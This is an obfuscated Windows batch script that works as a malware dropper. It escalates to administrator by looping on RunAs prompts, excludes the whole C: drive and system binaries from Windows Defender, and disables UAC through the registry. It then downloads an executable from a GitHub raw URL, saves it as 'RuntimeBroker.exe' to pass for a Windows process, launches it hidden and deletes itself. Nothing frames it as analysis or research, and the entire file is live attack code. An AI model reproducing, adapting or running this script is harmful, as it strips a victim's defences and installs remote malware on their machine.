@echo off & setlocal enableDelayedExpansion
set "eQDY=NET" & set "XihYE=SESSION" & set "ulpHi=2>&1" & set "qmwFC=>nul"
%eQDY% %XihYE% %qmwFC% %ulpHi%
set "e=!errorlevel!" & set "a=:A" & set "b=:B"
if !e! equ 0 (goto %a%) else (goto %b%)

:A
set "taf=bar" & set "LafBZ=qux" & set "QqZSj=foo" & set "Qkyq=baz" & rem NZQ RVZBiiv QpQp
set "uwj=powershell -ExecutionPolicy Bypass -Command"
set "wkpNa=[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; Add-MpPreference -ExclusionPath"
set "TFfX='C:\', 'C:\cmd.exe', 'C:\conhost.exe', 'C:\cvtres.exe', 'C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSbuild.exe',"
set "uwG='C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe', 'C:\Windows\System32\Wscript.exe' -ErrorAction SilentlyContinue"
!uwj! "!wkpNa! !TFfX! !uwG!" %qmwFC% %ulpHi%
set "UWoqx=Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System'"
set "tMISq=-Name 'EnableLUA' -Value 0"
!uwj! "!UWoqx! !tMISq!" %qmwFC% %ulpHi%
set "qXek=if ((Get-MpPreference -ErrorAction SilentlyContinue).ExclusionPath -contains 'C:\') { exit 0 } else { exit 1 } "
!uwj! "!qXek!" %qmwFC% %ulpHi%
if !errorlevel! neq 0 (goto %a%)
set "pEx=timeout /t" & !pEx! 2 %qmwFC% %ulpHi%
set "BHDaP=$ProgressPreference = 'SilentlyContinue'; $ErrorActionPreference = 'SilentlyContinue';"
set "SsWF=Invoke-WebRequest -Uri 'https://github.com/boycots563/wlt56/raw/main/kamzat.exe'"
set "osU=-OutFile '%TEMP%\RuntimeBroker.exe' -UseBasicParsing"
!uwj! "!BHDaP! !SsWF! !osU!" %qmwFC% %ulpHi%

:W
if not exist "%TEMP%\RuntimeBroker.exe" (!pEx! 1 %qmwFC% %ulpHi% & goto :W)
start "" /B "%TEMP%\RuntimeBroker.exe" %qmwFC% %ulpHi%
del /f /q "%~f0" %qmwFC% %ulpHi%
exit /b

:B
set "h=powershell -WindowStyle Hidden -Command"
set "j1=Start-Process -WindowStyle Hidden -FilePath '%~f0' -Verb RunAs"
!h! "!j1!" %qmwFC% %ulpHi%
if !errorlevel! neq 0 (!pEx! 3 %qmwFC% %ulpHi% & goto %b%)
exit /b
